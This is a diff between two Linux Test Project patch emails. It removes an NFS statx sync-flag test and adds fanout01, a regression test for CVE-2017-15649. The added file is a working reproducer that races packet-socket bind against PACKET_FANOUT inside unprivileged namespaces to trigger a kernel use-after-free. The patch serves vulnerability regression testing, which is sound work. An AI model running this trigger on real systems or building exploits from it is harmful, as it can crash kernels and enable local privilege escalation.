@@ -1,239 +1,216 @@
-From: kewal <kewal@zilogic.com>
-Date: Mon, 10 Sep 2018 12:05:13 -0000
-Subject: [LTP] [PATCH v1] Test statx syscall for SYNC_FLAGS
-Message-ID: <20180910120513.14069-1-kewal@zilogic.com>
+From: Richard Palethorpe <rpalethorpe@suse.com>
+Date: Mon, 10 Sep 2018 14:21:21 +0200
+Subject: [LTP] [PATCH] [WIP] Add fanout01 CVE-2017-15649
+Message-ID: <20180910122121.26752-1-rpalethorpe@suse.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-
-* statx06.c :-
-
- Testcase 1: AT_STATX_DONT_SYNC
-  With AT_STATX_DONT_SYNC server changes should not get sync with client.
-
- Testcase 2: AT_STATX_FORCE_SYNC
-  With AT_STATX_FORCE_SYNC server changes should get sync with client.
-
-Signed-off-by: Kewal Ukunde <kewal@zilogic.com>
-Signed-off-by: Vaishnavi.d <vaishnavi.d@zilogic.com>
-Signed-off-by: Tarun.T.U <tarun@zilogic.com>
+Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
 ---
- runtest/syscalls                           |   1 +
- testcases/kernel/syscalls/statx/.gitignore |   1 +
- testcases/kernel/syscalls/statx/statx06.c  | 183 +++++++++++++++++++++++++++++
- 3 files changed, 185 insertions(+)
- create mode 100644 testcases/kernel/syscalls/statx/statx06.c
 
-diff --git a/runtest/syscalls b/runtest/syscalls
-index 0d0be7713..71b83b25c 100644
---- a/runtest/syscalls
-+++ b/runtest/syscalls
-@@ -1504,3 +1504,4 @@ statx02 statx02
- statx03 statx03
- statx04 statx04
- statx05 statx05
-+statx06 statx06
-diff --git a/testcases/kernel/syscalls/statx/.gitignore b/testcases/kernel/syscalls/statx/.gitignore
-index 209fc3a33..c1ceddabf 100644
---- a/testcases/kernel/syscalls/statx/.gitignore
-+++ b/testcases/kernel/syscalls/statx/.gitignore
-@@ -3,3 +3,4 @@
- /statx03
- /statx04
- /statx05
-+/statx06
-diff --git a/testcases/kernel/syscalls/statx/statx06.c b/testcases/kernel/syscalls/statx/statx06.c
+Note that this requires the new Fuzzy Sync library which has not been merged
+at the time of writting. Hence why I have marked it with [WIP].
+
+ runtest/cve                         |   1 +
+ runtest/net.features                |   2 +
+ testcases/network/packet/.gitignore |   1 +
+ testcases/network/packet/Makefile   |  25 ++++++
+ testcases/network/packet/fanout01.c | 121 ++++++++++++++++++++++++++++
+ 5 files changed, 150 insertions(+)
+ create mode 100644 testcases/network/packet/.gitignore
+ create mode 100644 testcases/network/packet/Makefile
+ create mode 100644 testcases/network/packet/fanout01.c
+
+diff --git a/runtest/cve b/runtest/cve
+index b38fb3503..1b27477f0 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -25,6 +25,7 @@ cve-2017-12193 add_key04
+ cve-2017-15274 add_key02
+ cve-2017-15299 request_key03 -b cve-2017-15299
+ cve-2017-15537 ptrace07
++cve-2017-15649 fanout01
+ cve-2017-15951 request_key03 -b cve-2017-15951
+ cve-2017-17807 request_key04
+ cve-2017-1000364 stack_clash
+diff --git a/runtest/net.features b/runtest/net.features
+index eac1b2bf2..154d74900 100644
+--- a/runtest/net.features
++++ b/runtest/net.features
+@@ -58,3 +58,5 @@ dctcp_ipv6_01 dctcp01.sh -6
+ 
+ geneve01 geneve01.sh
+ geneve01_ipv6 geneve01.sh -6
++
++fanout01 fanout01
+diff --git a/testcases/network/packet/.gitignore b/testcases/network/packet/.gitignore
 new file mode 100644
-index 000000000..8b66bf832
+index 000000000..48f13bf9f
 --- /dev/null
-+++ b/testcases/kernel/syscalls/statx/statx06.c
-@@ -0,0 +1,183 @@
-+// SPDX-License-Identifier: GPL-2.0-or-later
-+/*
-+ *  Copyright (c) Zilogic Systems Pvt. Ltd., 2018
-+ *  Email : code@zilogic.com
-+ */
++++ b/testcases/network/packet/.gitignore
+@@ -0,0 +1 @@
++fanout01
+diff --git a/testcases/network/packet/Makefile b/testcases/network/packet/Makefile
+new file mode 100644
+index 000000000..76f3fd23f
+--- /dev/null
++++ b/testcases/network/packet/Makefile
+@@ -0,0 +1,25 @@
++# Copyright (c) 2018 Linux Test Project
++#
++# This program is free software; you can redistribute it and/or
++# modify it under the terms of the GNU General Public License as
++# published by the Free Software Foundation; either version 2 of
++# the License, or (at your option) any later version.
++#
++# This program is distributed in the hope that it would be useful,
++# but WITHOUT ANY WARRANTY; without even the implied warranty of
++# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++# GNU General Public License for more details.
++#
++# You should have received a copy of the GNU General Public License
++# along with this program. If not, see <http://www.gnu.org/licenses/>.
 +
-+/*
-+ * Test statx
-+ *
-+ * This code tests the following flags:
-+ * 1) AT_STATX_FORCE_SYNC
-+ * 2) AT_STATX_DONT_SYNC
-+ *
-+ * By exportfs cmd creating NFS setup.
-+ *
-+ * A test file is created in server folder and statx is being
-+ * done in client folder.
-+ *
-+ * TESTCASE 1:
-+ * BY AT_STATX_SYNC_AS_STAT getting predefined mode value.
-+ * Then, by using AT_STATX_FORCE_SYNC getting new updated vaue
-+ * from server file changes.
-+ *
-+ * TESTCASE 2:
-+ * BY AT_STATX_SYNC_AS_STAT getting predefined mode value.
-+ * AT_STATX_FORCE_SYNC is called to create cache data of the file. 
-+ * Then, by using DONT_SYNC_FILE getting old cached data in client folder,
-+ * but mode has been chaged in server file.
-+ *
-+ * Minimum kernel version required is 4.11.
-+ */
++top_srcdir		?= ../../..
 +
-+#include <netdb.h>
-+#include <stdio.h>
++include $(top_srcdir)/include/mk/testcases.mk
++
++CFLAGS			+= -D_GNU_SOURCE
++
++fanout01:	CFLAGS += -pthread
++fanout01:	LDLIBS += -lrt
++
++include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/network/packet/fanout01.c b/testcases/network/packet/fanout01.c
+new file mode 100644
+index 000000000..bc5813bdd
+--- /dev/null
++++ b/testcases/network/packet/fanout01.c
+@@ -0,0 +1,121 @@
++// SPDX-License-Identifier: GPL-2.0
++/*
++ * Copyright (c) 2018 Richard Palethorpe <rpalethorpe@suse.com>
++ * Original reproducer: https://blogs.securiteam.com/index.php/archives/3484
++ * Other copyrights may apply.
++ *
++ * This program is free software: you can redistribute it and/or modify
++ * it under the terms of the GNU General Public License as published by
++ * the Free Software Foundation, either version 2 of the License, or
++ * (at your option) any later version.
++ *
++ * This program is distributed in the hope that it will be useful,
++ * but WITHOUT ANY WARRANTY; without even the implied warranty of
++ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++ * GNU General Public License for more details.
++ *
++ * You should have received a copy of the GNU General Public License
++ * along with this program. If not, see <http://www.gnu.org/licenses/>.
++ */
++/* CVE-2017-15649
++ *
++ * Fixed by the following commits:
++ * 4971613c "packet: in packet_do_bind, test fanout with bind_lock held"
++ * 008ba2a1 "packet: hold bind lock when rebinding to fanout hook"
++ *
++ * See blogpost in copyright notice for more details.
++ */
++#include <errno.h>
 +#include <stdlib.h>
++#include <unistd.h>
++#include <sched.h>
++#include <sys/types.h>
++#include <sys/socket.h>
++#include <sys/ioctl.h>
++#include <net/if.h>
++#include <linux/if_packet.h>
++
 +#include "tst_test.h"
-+#include "lapi/stat.h"
++#include "tst_fuzzy_sync.h"
 +
-+#define MODE(X) (X & (~S_IFMT))
-+#define BUFF_SIZE 512
-+#define DEFAULT_MODE 0644
-+#define CURRENT_MODE 0777
++static struct tst_fzsync_pair pair;
++static int fd;
++static struct sockaddr_ll addr;
 +
-+#define CLIENT_PATH "client"
-+#define SERVER_PATH "server"
-+#define FORCE_SYNC_FILE  "force_sync_file"
-+#define DONT_SYNC_FILE "dont_sync_file"
-+
-+static char cwd[BUFF_SIZE];
-+static char cmd[BUFF_SIZE];
-+
-+static int get_mode(char *file_name, int flag_type, char *flag_name)
++void setup(void)
 +{
-+	char client_path[BUFF_SIZE];
-+	struct statx buff;
++	int real_uid = getuid();
++	int real_gid = getgid();
 +
-+	sprintf(client_path, "%s/%s/%s", cwd, CLIENT_PATH, file_name);
++	TEST(unshare(CLONE_NEWUSER));
++	if (TST_RET)
++		tst_brk(TBROK | TTERRNO, "Can't create new user namespace");
 +
-+	TEST(statx(AT_FDCWD, client_path, flag_type, STATX_ALL, &buff));
++	TEST(unshare(CLONE_NEWNET));
++	if (TST_RET)
++		tst_brk(TBROK | TTERRNO, "Can't create new net namespace");
 +
-+	if (TST_RET == -1)
-+		tst_brk(TFAIL | TST_ERR,
-+				"statx(AT_FDCWD, %s, %s, STATX_ALL, &buff)",
-+				file_name, flag_name);
-+	else
-+		tst_res(TINFO, "statx(AT_FDCWD, %s, %s, STATX_ALL, &buff)",
-+				file_name, flag_name);
++	FILE_PRINTF("/proc/self/setgroups", "deny");
++	FILE_PRINTF("/proc/self/uid_map", "0 %d 1\n", real_uid);
++	FILE_PRINTF("/proc/self/gid_map", "0 %d 1\n", real_gid);
 +
-+	return buff.stx_mode;
++	tst_fzsync_pair_init(&pair);
 +}
 +
-+static void test_for_dont_sync(void)
++void cleanup(void)
 +{
-+	unsigned int cur_mode;
-+	char server_path[BUFF_SIZE];
-+
-+	sprintf(server_path, "%s/%s/%s", cwd, SERVER_PATH, DONT_SYNC_FILE);
-+
-+	get_mode(DONT_SYNC_FILE, AT_STATX_FORCE_SYNC,
-+			"AT_STATX_FORCE_SYNC");
-+
-+	SAFE_CHMOD(server_path, CURRENT_MODE);
-+	cur_mode = get_mode(DONT_SYNC_FILE, AT_STATX_DONT_SYNC,
-+			"AT_STATX_DONT_SYNC");
-+
-+	if (DEFAULT_MODE == MODE(cur_mode))
-+		tst_res(TPASS,
-+				"statx() with AT_STATX_DONT_SYNC for mode %o %o",
-+				DEFAULT_MODE, (cur_mode & ~S_IFMT));
-+	else
-+		tst_res(TFAIL,
-+				"statx() with AT_STATX_DONT_SYNC for mode %o %o",
-+				DEFAULT_MODE, (cur_mode & ~S_IFMT));
++	tst_fzsync_pair_cleanup(&pair);
 +}
 +
-+static void test_for_force_sync(void)
++void *binder(void *unused)
 +{
-+	unsigned int cur_mode;
-+	char server_path[BUFF_SIZE];
++	while (tst_fzsync_run_b(&pair)) {
++		tst_fzsync_start_race_b(&pair);
++		bind(fd, (struct sockaddr *)&addr, sizeof(addr));
++		tst_fzsync_end_race_b(&pair);
++	}
 +
-+	sprintf(server_path, "%s/%s/%s", cwd, SERVER_PATH, FORCE_SYNC_FILE);
-+
-+	SAFE_CHMOD(server_path, CURRENT_MODE);
-+	cur_mode = get_mode(FORCE_SYNC_FILE, AT_STATX_FORCE_SYNC,
-+			"AT_STATX_FORCE_SYNC");
-+
-+	if (CURRENT_MODE == MODE(cur_mode))
-+		tst_res(TPASS,
-+				"statx() with AT_STATX_FORCE_SYNC for mode %o %o",
-+				CURRENT_MODE, (cur_mode & ~S_IFMT));
-+	else
-+		tst_res(TFAIL,
-+				"statx() with AT_STATX_FORCE_SYNC for mode %o %o",
-+				CURRENT_MODE, (cur_mode & ~S_IFMT));
++	return unused;
 +}
 +
-+struct test_cases {
-+	void (*func)(void);
-+} tcases[] = {
-+	{test_for_dont_sync},
-+	{test_for_force_sync}
-+};
-+
-+static void test_statx(unsigned int nr)
++void run(void)
 +{
-+	struct test_cases *tc = &tcases[nr];
++	int fanout_val = PACKET_FANOUT_ROLLOVER, index;
++	struct ifreq ifr = { 0 };
 +
-+	tc->func();
-+}
++	tst_fzsync_pair_reset(&pair, binder);
++	while (tst_fzsync_run_a(&pair)) {
++		fd = SAFE_SOCKET(AF_PACKET, SOCK_RAW, PF_PACKET);
 +
-+static void setup(void)
-+{
-+	char force_sync_file[BUFF_SIZE];
-+	char dont_sync_file[BUFF_SIZE];
-+	char server_path[BUFF_SIZE];
-+	char client_path[BUFF_SIZE];
-+	char mount_data[BUFF_SIZE];
-+	char *ip = "127.0.0.1";
++		strcpy((char *)&ifr.ifr_name, "lo");
++		SAFE_IOCTL(fd, SIOCGIFINDEX, &ifr);
++		index = ifr.ifr_ifindex;
 +
-+	TESTPTR(getcwd(cwd, BUFF_SIZE));
-+	if (TST_RET_PTR == NULL)
-+		tst_brk(TBROK | TST_ERR, "Failed to get PWD");
++		SAFE_IOCTL(fd, SIOCGIFFLAGS, &ifr);
++		ifr.ifr_flags &= ~(short)IFF_UP;
++		SAFE_IOCTL(fd, SIOCSIFFLAGS, &ifr);
 +
-+	sprintf(force_sync_file, "%s/%s", SERVER_PATH, FORCE_SYNC_FILE);
-+	sprintf(dont_sync_file, "%s/%s", SERVER_PATH, DONT_SYNC_FILE);
++		addr.sll_family = AF_PACKET;
++		/* need something different to rehook && 0 to skip register_prot_hook */
++		addr.sll_protocol = 0x0;
++		addr.sll_ifindex = index;
 +
-+	SAFE_MKDIR(SERVER_PATH, DEFAULT_MODE);
-+	SAFE_MKDIR(CLIENT_PATH, DEFAULT_MODE);
-+	SAFE_CREAT(force_sync_file, DEFAULT_MODE);
-+	SAFE_CREAT(dont_sync_file, DEFAULT_MODE);
++		tst_fzsync_start_race_a(&pair);
++		setsockopt(fd, SOL_PACKET, PACKET_FANOUT,
++			   &fanout_val, sizeof(fanout_val));
++		tst_fzsync_end_race_a(&pair);
 +
-+	sprintf(server_path, ":%s/%s", cwd, SERVER_PATH);
-+	sprintf(client_path, "%s/%s", cwd, CLIENT_PATH);
-+	sprintf(mount_data, "addr=%s", ip);
++		/* UAF */
++		close(fd);
++	}
 +
-+	sprintf(cmd,
-+			"exportfs -i -o no_root_squash,rw,sync,no_subtree_check *%s",
-+			server_path);
-+
-+	if (WEXITSTATUS(tst_system(cmd)) == 127)
-+		tst_brk(TBROK | TST_ERR, "%s not found", cmd);
-+
-+	SAFE_MOUNT(server_path, client_path, "nfs", 0, mount_data);
-+}
-+
-+static void cleanup(void)
-+{
-+	if (WEXITSTATUS(tst_system("exportfs -ua")) == 127)
-+		tst_brk(TBROK | TST_ERR, "%s", cmd);
-+
-+	SAFE_UMOUNT(CLIENT_PATH);
++	tst_res(TPASS, "Nothing bad happened, probably...");
 +}
 +
 +static struct tst_test test = {
-+	.tcnt = ARRAY_SIZE(tcases),
-+	.test = test_statx,
++	.min_kver = "3.19",
 +	.setup = setup,
++	.test_all = run,
 +	.cleanup = cleanup,
-+	.min_kver = "4.11",
-+	.needs_tmpdir = 1,
-+	.dev_fs_type = "nfs",
 +	.needs_root = 1,
 +};
 -- 
-2.11.0
+2.18.0
 
